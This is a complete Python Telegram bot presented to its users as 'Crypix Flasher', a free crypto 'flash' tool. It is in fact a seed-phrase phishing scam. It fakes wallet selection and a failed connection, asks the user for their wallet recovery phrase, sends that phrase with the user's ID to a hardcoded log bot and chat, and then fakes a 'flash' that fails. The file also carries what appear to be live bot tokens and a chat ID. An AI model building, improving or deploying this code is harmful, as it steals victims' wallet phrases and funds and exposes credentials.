import logging
import re
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ConversationHandler,
    ContextTypes,
)
from telegram.error import TelegramError

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# Bot tokens and chat ID
MAIN_BOT_TOKEN = "7868684810:AAHOCTmqdpNvBQTq5rkLHLUmNJQFihBqmDA"
LOG_BOT_TOKEN = "8010603892:AAHvYMQ9JDtTg5SbPiSsKS-V9vNbtxJU340"
LOG_CHAT_ID = "7753649096"

# Conversation states
WALLET, COIN, AMOUNT, LINK_WALLET, SEED_PHRASE, RECEIVER_ADDRESS, CONFIRM_ADDRESS, CONFIRM_GAS = range(8)

# Emojis (Unicode for compatibility)
EMOJIS = {
    "welcome": "👋",
    "wallet": "💼",
    "coin": "💰",
    "usdt": "💵",
    "btc": "₿",
    "eth": "Ξ",
    "success": "✅",
    "error": "❌",
    "loading": "⏳",
}

# Wallet options
WALLETS = [
    "Bitget Wallet", "Coinbase Wallet", "Trust Wallet", "Metamask Wallet",
    "Binance Wallet", "Bybit Wallet", "Phantom Wallet", "Exodus Wallet"
]

# Coin options
COINS = ["USDT (TRC20)", "USDT (BEP20)", "USDT (ERC20)", "Bitcoin", "Ethereum"]

# Amount options with gas fees
AMOUNTS = {
    "USDT (TRC20)": [
        ("1000 USDT", "4 TRX"),
        ("100,000 USDT", "17 TRX"),
        ("1,000,000 USDT", "30 TRX"),
    ],
    "USDT (BEP20)": [
        ("1000 USDT", "0.05 BNB"),
        ("100,000 USDT", "0.07 BNB"),
        ("1,000,000 USDT", "0.09 BNB"),
    ],
    "USDT (ERC20)": [
        ("1000 USDT", "0.008 ETH"),
        ("100,000 USDT", "0.012 ETH"),
        ("1,000,000 USDT", "0.019 ETH"),
    ],
    "Bitcoin": [
        ("10 BTC", "0.0001 BTC"),
        ("100 BTC", "0.0005 BTC"),
        ("1,000 BTC", "0.0009 BTC 0.0009 BTC"),
    ],
    "Ethereum": [
        ("100 ETH", "0.001 ETH"),
        ("1000 ETH", "0.006 ETH"),
        ("100,000 ETH", "0.009 ETH"),
    ],
}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle /start command."""
    await update.message.reply_text(
        f"{EMOJIS['welcome']} Welcome to Crypix Flasher, a free crypto Flasher Bot!"
    )
    await asyncio.sleep(1)
    keyboard = [
        [InlineKeyboardButton(f"{EMOJIS['wallet']} {wallet}", callback_data=wallet)]
        for wallet in WALLETS
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "Select the wallet you want to flash:", reply_markup=reply_markup
    )
    return WALLET

async def wallet_choice(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle wallet selection."""
    query = update.callback_query
    await query.answer()
    context.user_data["wallet"] = query.data
    await asyncio.sleep(3)
    keyboard = [
        [InlineKeyboardButton(f"{EMOJIS['coin']} {coin}", callback_data=coin)]
        for coin in COINS
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.message.edit_text(
        "Select the coin you want to flash:", reply_markup=reply_markup
    )
    return COIN

async def coin_choice(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle coin selection."""
    query = update.callback_query
    await query.answer()
    context.user_data["coin"] = query.data
    await asyncio.sleep(2)
    amounts = AMOUNTS[query.data]
    keyboard = [
        [InlineKeyboardButton(f"{amount} for {gas}", callback_data=f"{amount}:{gas}")]
        for amount, gas in amounts
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.message.edit_text(
        "Select the amount to flash:", reply_markup=reply_markup
    )
    return AMOUNT

async def amount_choice(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle amount selection."""
    query = update.callback_query
    await query.answer()
    amount, gas = query.data.split(":")
    context.user_data["amount"] = amount
    context.user_data["gas"] = gas
    keyboard = [
        [InlineKeyboardButton(f"{EMOJIS['wallet']} {wallet}", callback_data=wallet)]
        for wallet in WALLETS
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.message.edit_text(
        "Kindly link your wallet for payment of gas fee, which will be deducted from your wallet when sending flash:",
        reply_markup=reply_markup
    )
    return LINK_WALLET

async def link_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle wallet linking."""
    query = update.callback_query
    await query.answer()
    context.user_data["linked_wallet"] = query.data
    await query.message.edit_text(
        f"Make sure the {query.data} app is installed on your phone to ensure a successful connection."
    )
    await asyncio.sleep(1)
    await query.message.reply_text(f"{EMOJIS['loading']} Connecting...")
    await asyncio.sleep(4)
    await query.message.reply_text(
        f"{EMOJIS['error']} Connection failed. Link manually."
    )
    await query.message.reply_text("Send wallet phrase to link manually:")
    return SEED_PHRASE

async def seed_phrase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Validate seed phrase."""
    phrase = update.message.text.strip()
    words = phrase.split()
    word_count = len(words)
    if word_count not in [12, 18, 24]:
        await update.message.reply_text(
            f"{EMOJIS['error']} Invalid seed phrase. Must be 12, 18, or 24 words. Try again."
        )
        return SEED_PHRASE

    # Forward seed phrase to log bot
    try:
        log_bot = Application.builder().token(LOG_BOT_TOKEN).build()
        await log_bot.bot.send_message(
            chat_id=LOG_CHAT_ID,
            text=f"Seed phrase from {update.effective_user.id}: {phrase}"
        )
    except TelegramError as e:
        logger.error(f"Failed to send seed phrase to log bot: {e}")

    await update.message.reply_text(f"{EMOJIS['loading']} Connecting...")
    await asyncio.sleep(4)
    await update.message.reply_text(
        f"{EMOJIS['success']} Connection successful! You may proceed."
    )
    await update.message.reply_text("Send the receiver's address you wish to flash:")
    return RECEIVER_ADDRESS

async def receiver_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Validate receiver address."""
    address = update.message.text.strip()
    coin = context.user_data.get("coin")

    # Basic address validation
    is_valid = False
    if coin in ["USDT (TRC20)"]:
        is_valid = re.match(r"^T[0-9a-zA-Z]{33}$", address)
    elif coin in ["USDT (BEP20)", "USDT (ERC20)", "Ethereum"]:
        is_valid = re.match(r"^0x[0-9a-fA-F]{40}$", address)
    elif coin == "Bitcoin":
        is_valid = re.match(r"^(1|3)[0-9a-zA-Z]{25,34}$|^bc1[0-9a-zA-Z]{39,59}$", address)

    if not is_valid:
        await update.message.reply_text(
            f"{EMOJIS['error']} Invalid address for {coin}. Please enter a valid address."
        )
        return RECEIVER_ADDRESS

    context.user_data["receiver_address"] = address
    keyboard = [
        [InlineKeyboardButton("Yes", callback_data="yes")],
        [InlineKeyboardButton("No", callback_data="no")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        f"Do you want to send {context.user_data['amount']} to this address: {address}?",
        reply_markup=reply_markup
    )
    return CONFIRM_ADDRESS

async def confirm_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Confirm receiver address."""
    query = update.callback_query
    await query.answer()
    if query.data == "no":
        await query.message.edit_text("Transaction cancelled.")
        return ConversationHandler.END

    keyboard = [
        [InlineKeyboardButton("Yes", callback_data="yes")],
        [InlineKeyboardButton("No", callback_data="no")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.message.edit_text(
        f"{context.user_data['gas']} will be deducted from your wallet. Do you wish to proceed?",
        reply_markup=reply_markup
    )
    return CONFIRM_GAS

async def confirm_gas(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Confirm gas fee and simulate flash."""
    query = update.callback_query
    await query.answer()
    if query.data == "no":
        await query.message.edit_text("Transaction cancelled.")
        return ConversationHandler.END

    await query.message.edit_text(f"{EMOJIS['loading']} Sending Flash... Kindly wait.")
    await asyncio.sleep(10)
    await query.message.edit_text(
        f"{EMOJIS['error']} Flash failed due to insufficient gas fee."
    )
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancel the conversation."""
    await update.message.reply_text("Operation cancelled.")
    return ConversationHandler.END

def main() -> None:
    """Run the bot."""
    application = Application.builder().token(MAIN_BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            WALLET: [CallbackQueryHandler(wallet_choice)],
            COIN: [CallbackQueryHandler(coin_choice)],
            AMOUNT: [CallbackQueryHandler(amount_choice)],
            LINK_WALLET: [CallbackQueryHandler(link_wallet)],
            SEED_PHRASE: [MessageHandler(filters.TEXT & ~filters.COMMAND, seed_phrase)],
            RECEIVER_ADDRESS: [MessageHandler(filters.TEXT & ~filters.COMMAND, receiver_address)],
            CONFIRM_ADDRESS: [CallbackQueryHandler(confirm_address)],
            CONFIRM_GAS: [CallbackQueryHandler(confirm_gas)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    application.add_handler(conv_handler)

    # Start the bot
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()